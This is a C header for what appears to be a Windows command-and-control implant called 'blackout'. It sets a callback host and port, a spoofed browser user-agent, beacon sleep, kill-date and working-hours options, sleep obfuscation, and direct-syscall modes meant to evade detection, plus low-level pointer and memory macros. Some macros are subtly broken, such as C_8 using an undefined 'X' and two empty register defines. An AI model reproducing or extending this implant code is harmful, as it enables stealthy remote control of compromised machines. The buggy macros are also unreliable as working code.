#ifndef BLACKOUT_MACROS_H
#define BLACKOUT_MACROS_H

//
// blackout config
//
#define CONFIG_HOST       L"172.29.29.80"
#define CONFIG_PORT       4433
#define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
#define CONFIG_SECURE     FALSE
#define CONFIG_WRKHRS     NULL
#define CONFIG_KILLDATE   NULL
#define CONFIG_SLEEP      3

#ifndef _BK_SLEEP_OBF_
#define _BK_SLEEP_OBF_ 0  
#endif
#define _BK_SLEEP_TIMER_   0x1030
#define _BK_SLEEP_APC_     0x2030

#ifndef _BK_API_
#define _BK_API_ 0x1030
#endif
#define _BK_API_WINAPI_  0x1030
#define _BK_API_NTAPI_   0x2030
#define _BK_API_SYSCALL_ 0x3030

// pseudo handles
#define NtCurrentProcess()              ( (HANDLE)(-1) )
#define NtCurrentThread()               ( (HANDLE)(-2) )
#define NtCurrentProcessToken()         ( (HANDLE)(-4) )
#define NtCurrentThreadToken()          ( (HANDLE)(-5) )
#define NtCurrentThreadEffectiveToken() ( (HANDLE)(-6) )

//
// instance related macros
//
#define InstanceOffset()  ( U_PTR( & __Instance_offset ) )
#define InstancePtr()     ( ( PINSTANCE ) C_DEF( C_PTR( U_PTR( StRipStart() ) + InstanceOffset() ) ) )
#define Instance()        ( ( PINSTANCE ) __LocalInstance )
#define Blackout()        ( ( ( PINSTANCE ) __LocalInstance )->Blackout )
#define Syscall()         ( ( ( PINSTANCE ) __LocalInstance )->Blackout.Syscall )
#define Transport()       ( ( ( PINSTANCE ) __LocalInstance )->Transport )
#define BK_PACKAGE          InstancePtr()->Transport.Http.Package
#define BK_PRINT(fmt, ...)  InstancePtr()->Win32.printf(fmt, ##__VA_ARGS__)
#define BLACKOUT_INSTANCE PINSTANCE __LocalInstance = InstancePtr();

//
// utils macros
//
#define D_API( x )  __typeof__( x ) * x;
#define D_SEC( x )  __attribute__( ( section( ".text$" #x "" ) ) )
#define FUNC        D_SEC( B )
#define ST_GLOBAL   __attribute__( ( section( ".global" ) ) )
#define ST_READONLY __attribute__( ( section( ".rdata" ) ) )
#define PAGE_SIZE 0x1000 
#define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((PAGE_SIZE - (((ULONG_PTR)x) & (PAGE_SIZE - 1))) % PAGE_SIZE))
#define NtGetLastError() Instance()->Teb->LastErrorValue
#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) { sizeof(OBJECT_ATTRIBUTES), n, NULL, a, NULL, NULL }
#define RBX_REG 0x23
#define RDI_REG
#define RAX_REG

//
// type castinng lenght 
//
#define C_8( x )   ( ( INT8 )   ( X ) )
#define C_16( x )  ( ( INT16 )  ( x ) )
#define C_32( x )  ( ( INT32 )  ( x ) )
#define C_64( x )  ( ( INT64 )  ( x ) )
#define U_8( x )  ( ( UINT8 )  ( x ) )
#define U_16( x ) ( ( UINT16 ) ( x ) )
#define U_32( x ) ( ( UINT32 ) ( x ) )
#define U_64( x ) ( ( UINT64 ) ( x ) )

//
// casting macros
//
#define C_PTR( x )   ( ( PVOID    ) ( x ) )
#define U_PTR( x )   ( ( UINT_PTR ) ( x ) )
#define B_PTR( x )   ( ( PBYTE    ) ( x ) )
#define U_PTR32( x ) ( ( ULONG    ) ( x ) )
#define U_PTR64( x ) ( ( ULONG64  ) ( x ) )
#define A_PTR( x )   ( ( PCHAR    ) ( x ) )
#define W_PTR( x )   ( ( PWCHAR   ) ( x ) )

//
// dereference memory macros
//
#define C_DEF( x )   ( * ( PVOID* )  ( x ) )
#define C_DEF08( x ) ( * ( UINT8*  ) ( x ) )
#define C_DEF16( x ) ( * ( UINT16* ) ( x ) )
#define C_DEF32( x ) ( * ( UINT32* ) ( x ) )
#define C_DEF64( x ) ( * ( UINT64* ) ( x ) )

//
// memory related macros
//
#define MmCopy __builtin_memcpy
#define MmSet  __stosb
#define MmZero RtlSecureZeroMemory

/* Clion IDE hacks */
#ifdef  __cplusplus
#define CONSTEXPR         constexpr
#define TEMPLATE_TYPENAME template <typename T>
#define INLINE            inline
#else
#define CONSTEXPR
#define TEMPLATE_TYPENAME
#define INLINE
#endif

#endif //BLACKOUT_MACROS_H
